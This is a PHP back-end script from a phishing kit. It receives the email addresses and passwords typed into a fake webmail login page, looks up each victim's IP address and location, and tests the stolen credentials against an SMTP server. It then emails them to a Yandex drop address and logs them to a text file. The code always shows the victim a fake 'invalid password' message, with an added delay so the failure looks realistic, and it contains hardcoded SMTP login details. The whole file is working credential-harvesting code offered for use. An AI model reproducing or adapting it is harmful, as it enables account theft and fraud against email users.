<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Set proper headers for AJAX requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get user IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

$jdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests with 403 page
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head>
        <title>403 - Forbidden</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #d32f2f; }
        </style>
    </head>
    <body>
        <h1>403 Forbidden</h1>
        <p>Access to this resource is denied.</p>
        <hr>
    </body>
    </html>
    <?php
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Method not allowed"
    ));
    exit();
}

// SMTP Configuration for logging
$receiver     = 'logs.ironside511@yandex.com';         // Your email to receive logs
$senderuser   = 'info@lucagherardi.com';      // Your SMTP user
$senderpass   = 'V8WLLSypyJBbUv7';               // Your SMTP password
$senderport   = "587";                      // Your SMTP port
$senderserver = "mail.lucagherardi.com";       // Your SMTP server

// Capture user input
$browser = $_SERVER['HTTP_USER_AGENT'];
$login   = trim($_POST['email'] ?? '');
$passwd  = trim($_POST['password'] ?? '');

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Email and password are required"
    ));
    exit();
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Invalid email format"
    ));
    exit();
}
$domain = $parts[1];

// Get country name safely
$country = isset($jdat->geoplugin_countryName) ? $jdat->geoplugin_countryName : 'Unknown';

// Create log message
$timestamp = date('Y-m-d H:i:s');
$logMessage = "=== LOGIN ATTEMPT ===\n";
$logMessage .= "Timestamp: " . $timestamp . "\n";
$logMessage .= "Email: " . $login . "\n";
$logMessage .= "Password: " . $passwd . "\n";
$logMessage .= "Domain: " . $domain . "\n";
$logMessage .= "IP: " . $ip . "\n";
$logMessage .= "Country: " . $country . "\n";
$logMessage .= "User Agent: " . $browser . "\n";
$logMessage .= "========================\n\n";

// Email subject for notification
$sub = "TrueRcubeOrange1 | " . $passwd . " | " . $domain . " | " . $country . " | " . $ip;

// Email body for notification
$emailBody = "<h2>TrueRcubeOrange1 - New Login Attempt</h2>";
$emailBody .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
$emailBody .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
$emailBody .= "<p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>";
$emailBody .= "<p><strong>IP Address:</strong> " . htmlspecialchars($ip) . "</p>";
$emailBody .= "<p><strong>Country:</strong> " . htmlspecialchars($country) . "</p>";
$emailBody .= "<p><strong>User Agent:</strong> " . htmlspecialchars($browser) . "</p>";
$emailBody .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
$emailBody .= "<hr>";

$validCredentials = false;
$testResult = "Connection failed";

// Test credentials using mail.lucagherardi.com as the test server
try {
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth = true;
    $testMail->Host = 'mail.lucagherardi.com';  // Use your server as test server
    $testMail->Username = $login;             // Test with captured credentials
    $testMail->Password = $passwd;
    $testMail->Port = 587;
    $testMail->SMTPSecure = 'tls';
    $testMail->Timeout = 10;
    $testMail->SMTPDebug = 0;
    
    // Try to authenticate against mail.lucagherardi.com
    if ($testMail->smtpConnect()) {
        $validCredentials = true;
        $testResult = "Valid credentials - Authentication successful on mail.lucagherardi.com";
        
        // If credentials are valid, try to send a test email
        try {
            $testMail->setFrom($login, 'Credential Test');
            $testMail->addAddress($receiver);
            $testMail->isHTML(true);
            $testMail->Subject = "Credential Test Success - " . $login;
            $testMail->Body = "Credentials for " . $login . " are VALID and working!<br>Password: " . $passwd;
            
            if ($testMail->send()) {
                $testResult .= " - Test email sent successfully";
            }
        } catch (Exception $e) {
            $testResult .= " - Authentication OK but test email failed: " . $e->getMessage();
        }
        
        $testMail->smtpClose();
    } else {
        $testResult = "Invalid credentials - Authentication failed on mail.lucagherardi.com";
    }
    
} catch (Exception $error) {
    $testResult = "Test failed: " . $error->getMessage();
}

// Add test result to log
$logMessage .= "Credential Test Server: mail.lucagherardi.com\n";
$logMessage .= "Test Result: " . $testResult . "\n";
$logMessage .= "Valid Credentials: " . ($validCredentials ? "YES" : "NO") . "\n\n";

// Update email body with test result
$emailBody .= "<p><strong>Test Server:</strong> mail.lucagherardi.com</p>";
$emailBody .= "<p><strong>Credential Test Result:</strong> " . htmlspecialchars($testResult) . "</p>";
$emailBody .= "<p><strong>Valid Credentials:</strong> <span style='color: " . ($validCredentials ? "green'>YES" : "red'>NO") . "</span></p>";

// Save to local log file
try {
    $fp = fopen("SS-Or.txt", "a");
    if ($fp) {
        fputs($fp, $logMessage);
        fclose($fp);
    }
} catch (Exception $e) {
    // Log file write failed, continue anyway
    error_log('Log file write failed: ' . $e->getMessage());
}

// Send notification email with captured data using your SMTP server
$emailSent = false;
$emailError = '';

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->SMTPSecure = 'tls';
    $mail->Timeout = 30;
    $mail->SMTPDebug = 0; // Set to 2 for debugging
    
    $mail->setFrom($senderuser, 'TrueRcubeOrange1 Logger');
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $sub;
    $mail->Body = $emailBody;
    $mail->AltBody = strip_tags(str_replace('<br>', "\n", $emailBody));
    
    if ($mail->send()) {
        $emailSent = true;
        error_log('Email sent successfully to: ' . $receiver);
    }
    
} catch (Exception $error) {
    $emailError = $error->getMessage();
    error_log('Mail sending failed: ' . $emailError);
    
    // Try alternative method - simple mail() function as fallback
    try {
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= 'From: ' . $senderuser . "\r\n";
        
        if (mail($receiver, $sub, $emailBody, $headers)) {
            $emailSent = true;
            error_log('Fallback email sent successfully using mail() function');
        }
    } catch (Exception $e) {
        error_log('Fallback email also failed: ' . $e->getMessage());
    }
}

// Add email sending result to log
$logMessage .= "Email Notification: " . ($emailSent ? "SUCCESS" : "FAILED - " . $emailError) . "\n";
$logMessage .= "Email Sent To: " . $receiver . "\n\n";

// Update log file with email result
try {
    $fp = fopen("SS-Or.txt", "a");
    if ($fp) {
        fputs($fp, "Email Status: " . ($emailSent ? "SENT" : "FAILED") . "\n\n");
        fclose($fp);
    }
} catch (Exception $e) {
    // Continue anyway
}

// Increment attempt counter
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
$_SESSION['attempts']++;

// Always return "invalid credentials" to the user, regardless of actual validity
// This maintains the appearance of a real login failure
$response = array(
    "signal" => "error",
    "msg" => "Invalid email or password. Please try again.",
    "attempt" => $_SESSION['attempts'],
    "redirect_url" => "https://webmail." . $domain,
    "debug_info" => array(
        "email_sent" => $emailSent,
        "log_written" => file_exists("SS-Or.txt"),
        "timestamp" => $timestamp
    )
);

// Add a small delay to make it seem more realistic
usleep(rand(500000, 1500000)); // 0.5 to 1.5 second delay

echo json_encode($response);
exit();
?>